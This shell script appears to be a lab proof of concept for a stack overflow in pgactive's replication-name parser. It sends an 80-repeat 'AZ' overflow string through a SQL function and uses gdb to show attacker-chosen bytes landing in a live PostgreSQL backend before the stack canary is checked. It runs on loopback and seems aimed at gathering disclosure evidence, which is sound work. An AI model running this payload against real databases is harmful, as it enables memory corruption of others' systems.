#!/bin/sh
# Live-backend chosen-byte capture on the verbatim v2.1.9 parser SQL path.
# The plain backend survives the overflow because elog(ERROR) longjmps before
# the stack-canary check; this script stops the backend at the elog call with
# gdb and reads the already-written replication_name bytes from the live
# process. Loopback only; nothing outside the lab is contacted.
set -u
cd "$(dirname "$0")" || exit 1
PGBIN=${PGBIN:-/tmp/pgactive-build/pg16root/usr/lib/postgresql/16/bin}
PGINC=${PGINC:-/tmp/pgactive-build/pg16root/usr/include/postgresql/16/server}
PORT=${PORT:-58419}
ROOT=${PWD}
PGDATA=${ROOT}/pgdata-gdb
SOCK=${ROOT}/sock-gdb
FIFO=${ROOT}/evidence/gdb-fifo
rm -f "$FIFO"; mkfifo "$FIFO"
mkdir -p evidence "$SOCK"
rm -rf "$PGDATA" evidence/gdb-client.out evidence/gdb-live-capture.out \
      evidence/gdb-pgstart.log evidence/gdb-pgstop.log

gcc -O0 -g -fPIC -fstack-protector-strong -shared -I"$PGINC" \
    parser.c -o parser-vuln.so 2>evidence/gdb-build.log
echo "GDB_BUILD=$?"

"$PGBIN/initdb" -D "$PGDATA" -A trust --no-sync --no-instructions \
    >evidence/gdb-initdb.log 2>&1
echo "GDB_INITDB=$?"
"$PGBIN/pg_ctl" -D "$PGDATA" -l "$ROOT/evidence/gdb-server.log" -w start \
    -o "-p $PORT -k $SOCK -c listen_addresses=127.0.0.1" \
    >evidence/gdb-pgstart.log 2>&1
echo "GDB_PGSTART=$?"
PSQL="$PGBIN/psql -h $SOCK -p $PORT -d postgres -X -q -A -t"

$PSQL -v libdir="$ROOT/parser-vuln.so" -f setup.sql \
    >evidence/gdb-setup.out 2>&1
echo "GDB_SETUP=$?"

# Keep one backend alive on a FIFO so its pid is known before the attack.
$PSQL < "$FIFO" >evidence/gdb-client.out 2>&1 &
CLIENT=$!
exec 3>"$FIFO"
printf 'SELECT pg_backend_pid();\n' >&3
BPID=""
i=0
while [ $i -lt 100 ]; do
    if [ -s evidence/gdb-client.out ]; then
        IFS= read -r BPID < evidence/gdb-client.out || BPID=""
        case "$BPID" in
            ''|*[!0-9]*) BPID="" ;;
            *) break ;;
        esac
    fi
    i=$((i+1))
    sleep 0.1
done
echo "GDB_BACKEND_PID=$BPID"
if [ -z "$BPID" ]; then
    echo "GDB_ATTACH=NO_PID"
else
    # Load parser-vuln.so into this backend before setting a source breakpoint.
    printf "SELECT * FROM pgactive_parse_replident_name('pgactive_123_1_2_3_');\n" >&3
    gdb -q -batch -p "$BPID" \
        -ex 'set pagination off' \
        -ex 'set confirm off' \
        -ex 'break parser.c:67' \
        -ex 'continue' \
        -ex 'printf "=== STOPPED AT elog, sscanf write complete ===\n"' \
        -ex 'frame 0' \
        -ex 'p &replication_name' \
        -ex 'p (char *) replication_name' \
        -ex 'x/128bx &replication_name' \
        -ex 'bt 3' \
        -ex 'detach' \
        -ex 'quit' \
        >evidence/gdb-live-capture.out 2>&1 &
    GDBJOB=$!
    ATTACK="pgactive_123_1_2_3_$(printf 'AZ%.0s' $(seq 1 80))"
    printf "SELECT * FROM pgactive_parse_replident_name('$ATTACK');\n" >&3
    wait "$GDBJOB"
    echo "GDB_CAPTURE_RC=$?"
fi
exec 3>&-
wait "$CLIENT"
echo "GDB_CLIENT_RC=$?"
echo '--- chosen-byte offsets in live backend (expect AZ pattern) ---'
grep -E '0x[0-9a-f]+:|replication_name|STOPPED|#0 |#1 ' \
    evidence/gdb-live-capture.out || true
echo '--- client output ---'
cat evidence/gdb-client.out

"$PGBIN/pg_ctl" -D "$PGDATA" -m fast -w stop >evidence/gdb-pgstop.log 2>&1
echo "GDB_PGSTOP=$?"
